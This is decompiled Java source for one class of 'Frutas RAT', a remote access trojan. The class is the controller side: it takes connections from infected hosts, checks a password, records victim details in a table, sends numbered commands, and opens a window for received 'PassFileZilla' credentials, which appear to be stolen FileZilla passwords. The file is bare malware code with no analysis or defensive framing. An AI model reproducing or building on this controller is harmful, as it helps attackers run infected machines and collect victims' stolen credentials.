/*     */ package cliente;
/*     */ 
/*     */ import Extras.JdeskTopPanel;
/*     */ import java.io.DataInputStream;
/*     */ import java.io.DataOutputStream;
/*     */ import java.io.IOException;
/*     */ import java.io.InputStream;
/*     */ import java.io.OutputStream;
/*     */ import java.io.PrintStream;
/*     */ import java.net.InetAddress;
/*     */ import java.net.Socket;
/*     */ import java.util.HashMap;
/*     */ import java.util.logging.Level;
/*     */ import java.util.logging.Logger;
/*     */ import javax.swing.JPasswordField;
/*     */ 
/*     */ public class Usuario extends Thread
/*     */ {
/*  12 */   private boolean status = false;
/*     */   private FrutaManager fruta;
/*     */   private OutputStream salida;
/*     */   private InputStream entrada;
/*     */   private Socket socket;
/*     */   private String dentificador;
/*     */   private DataOutputStream salsocket;
/*     */ 
/*     */   public Usuario(Socket socket, FrutaManager frut)
/*     */   {
/*     */     try
/*     */     {
/*  23 */       this.fruta = frut;
/*  24 */       this.socket = socket;
/*  25 */       this.entrada = this.socket.getInputStream();
/*  26 */       this.salida = this.socket.getOutputStream();
/*  27 */       this.salsocket = new DataOutputStream(this.salida);
/*     */     }
/*     */     catch (IOException ex)
/*     */     {
/*  31 */       System.out.println(ex.getMessage());
/*  32 */       this.status = false;
/*     */     }
/*     */   }
/*     */ 
/*  36 */   public Socket getSock() { return this.socket; }
/*     */ 
/*     */   public void sendComando(int i)
/*     */   {
/*     */     try {
/*  41 */       this.salsocket.writeInt(i);
/*     */     }
/*     */     catch (IOException ex) {
/*  44 */       System.out.println("Error enviando comando" + i);
/*     */     }
/*     */   }
/*     */ 
/*     */   public void sendComando(int i, String cmd) {
/*     */     try {
/*  50 */       this.salsocket.writeInt(i);
/*  51 */       this.salsocket.writeUTF(cmd);
/*  52 */       System.out.println("El mensaje consumio: " + this.salsocket.size() + " bytes");
/*     */     } catch (IOException ex) {
/*  54 */       System.out.println("Error enviando comando " + i + " texto" + cmd);
/*     */     }
/*     */   }
/*     */ 
/*     */   public String getIdentificador()
/*     */   {
/*  61 */     return this.dentificador;
/*     */   }
/*     */   public boolean isConectado() {
/*  64 */     System.out.println("leeere la pass");
/*  65 */     DataInputStream leepass = new DataInputStream(this.entrada);
/*     */ 
/*  67 */     System.out.println("Lei la passss");
/*     */     try {
/*  69 */       String d = leepass.readUTF();
/*  70 */       System.out.println("Contraseña Recibidia: " + d);
/*  71 */       System.out.println("Contraseña Local: " + new String(this.fruta.pass.getPassword()));
/*  72 */       if (d.equalsIgnoreCase(new String(this.fruta.pass.getPassword()))) {
/*  73 */         this.status = true;
/*  74 */         this.salsocket.writeUTF("SI");
/*     */       } else {
/*  76 */         this.salsocket.writeUTF("NO");
/*     */       }
/*     */     }
/*     */     catch (IOException ex) {
/*  80 */       System.out.println(ex.getMessage());
/*     */     }
/*     */ 
/*  83 */     return this.status;
/*     */   }
/*     */ 
/*     */   public void agregarAtABLA() {
/*  87 */     this.fruta.ModificaTabla("", getInfoInicial(), false);
/*     */   }
/*     */ 
/*     */   private String[] getInfoInicial()
/*     */   {
/*  94 */     String[] datoss = new String[8];
/*     */     try {
/*  96 */       DataInputStream entradas = new DataInputStream(this.entrada);
/*     */ 
/*  98 */       String tmp = entradas.readUTF();
/*  99 */       String[] datitos = tmp.split("\\?");
/* 100 */       System.out.println(datitos.length);
/* 101 */       datoss[0] = datitos[0];
/* 102 */       datoss[1] = datitos[1];
/*     */ 
/* 105 */       Escucha.USUARIOS.put(datoss[1], this);
/*     */ 
/* 108 */       this.dentificador = datitos[1];
/* 109 */       datoss[2] = this.socket.getInetAddress().getHostAddress();
/* 110 */       datoss[3] = datitos[2];
/* 111 */       datoss[4] = datitos[3];
/* 112 */       datoss[5] = datitos[4];
/* 113 */       datoss[6] = datitos[5];
/* 114 */       if (datitos.length == 6) return datoss;
/* 115 */       datoss[7] = datitos[6];
/*     */     }
/*     */     catch (IOException ex)
/*     */     {
/* 119 */       Logger.getLogger(Usuario.class.getName()).log(Level.SEVERE, null, ex);
/*     */     }
/*     */ 
/* 123 */     return datoss;
/*     */   }
/*     */ 
/*     */   public void CierraConexion() {
/*     */     try {
/* 128 */       this.salsocket.close();
/* 129 */       this.entrada.close();
/* 130 */       this.salida.close();
/* 131 */       this.socket.close();
/*     */     } catch (IOException ex) {
/* 133 */       System.out.println("Error cerrando el socket");
/*     */     }
/*     */   }
/*     */ 
/*     */   public void run()
/*     */   {
/* 142 */     DataInputStream entra = new DataInputStream(this.entrada);
/*     */     try
/*     */     {
/*     */       while (true)
/*     */       {
/* 147 */         int i = entra.readInt();
/* 148 */         switch (i) {
/*     */         case 1:
/* 150 */           String pass = entra.readUTF();
/* 151 */           PassFileZilla m = new PassFileZilla(this, pass);
/* 152 */           m.setVisible(true);
/*     */ 
/* 154 */           m.setLocation(100, 100);
/*     */ 
/* 156 */           this.fruta.jdeskTopPanel1.add(m, 0);
/*     */         case 2:
/*     */         }
/*     */ 
/*     */       }
/*     */ 
/*     */     }
/*     */     catch (IOException ex)
/*     */     {
/* 166 */       System.out.println("Hubo error en la conexion yaestablecida");
/* 167 */       this.fruta.ModificaTabla(this.dentificador, null, false);
/*     */     }
/*     */   }
/*     */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.Usuario
 * JD-Core Version:    0.6.2
 */